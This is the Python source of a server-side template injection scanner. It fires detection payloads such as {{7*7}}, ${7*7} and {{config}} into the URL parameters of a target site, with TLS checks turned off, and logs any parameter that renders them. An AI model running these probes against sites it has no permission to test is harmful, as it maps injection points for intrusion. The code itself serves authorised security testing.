"""
GLITCHICONS ⬡ — SSTI Tester v1.0
Tests: Jinja2, Twig, Smarty, Freemarker, Pebble
"""
import requests
import sys
import time
from pathlib import Path
from datetime import datetime
from rich.console import Console
from rich.panel import Panel

console = Console()

SSTI_PAYLOADS = [
    # Detection
    ("{{7*7}}", "49"),           # Jinja2/Twig
    ("${7*7}", "49"),            # Freemarker/EL
    ("#{7*7}", "49"),            # Ruby ERB
    ("<%= 7*7 %>", "49"),        # ERB/EJS
    ("{{7*'7'}}", "7777777"),    # Jinja2
    # Jinja2 RCE attempts
    ("{{config}}", "Config"),
    ("{{self}}", "TemplateReference"),
    ("{{request}}", "Request"),
]

SSTI_ENGINES = {
    "Jinja2"    : ["{{", "}}"],
    "Twig"      : ["{{", "}}"],
    "Smarty"    : ["{$", "}"],
    "Freemarker": ["${", "}"],
    "Pebble"    : ["{{", "}}"],
    "ERB"       : ["<%=", "%>"],
}


def test_ssti(url, params=None, cookies=None, delay=0.5):
    """Test SSTI on URL parameters."""
    console.print(f"\n[bold]→ SSTI Detection[/bold]: {url}")
    session = requests.Session()
    if cookies:
        session.cookies.update(cookies)

    findings = []
    from urllib.parse import urlparse, parse_qs
    parsed = urlparse(url)
    if not params:
        params   = {k: v[0] for k, v in
                    parse_qs(parsed.query).items()}
        base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
    else:
        base_url = url

    if not params:
        # Try common params
        params   = {"q": "", "search": "",
                    "name": "", "input": ""}
        base_url = url

    for param in params:
        for payload, expected in SSTI_PAYLOADS:
            test_params = params.copy()
            test_params[param] = payload
            try:
                r = session.get(
                    base_url, params=test_params,
                    timeout=10, verify=False
                )
                if expected.lower() in r.text.lower():
                    console.print(
                        f"  [red]⚠ SSTI: param={param} "
                        f"payload={payload} "
                        f"result={expected}[/red]"
                    )
                    findings.append({
                        "type"    : "SSTI",
                        "param"   : param,
                        "payload" : payload,
                        "expected": expected,
                        "url"     : r.url,
                        "status"  : r.status_code,
                    })
                    break
                time.sleep(delay)
            except Exception:
                continue

    if not findings:
        console.print("  [green]No SSTI found[/green]")
    return findings


def run(url, cookies=None, output_dir=None):
    """Run SSTI test suite."""
    console.print(Panel(
        "[bold purple]⬡ GLITCHICONS SSTI TESTER[/bold purple]\n"
        f"[dim]Target: {url}[/dim]",
        border_style="purple"
    ))
    import warnings
    warnings.filterwarnings("ignore")

    findings = test_ssti(url, cookies=cookies)

    if output_dir and findings:
        import json
        out = Path(output_dir)
        out.mkdir(parents=True, exist_ok=True)
        ts  = datetime.now().strftime("%Y%m%d_%H%M%S")
        f   = out / f"ssti_findings_{ts}.json"
        f.write_text(json.dumps(findings, indent=2))
        console.print(f"\nReport: {f}")

    console.print(
        f"\n[bold]Total: {len(findings)} SSTI findings[/bold]"
    )
    return findings


if __name__ == "__main__":
    run(sys.argv[1] if len(sys.argv) > 1 else
        "https://target.example.com")
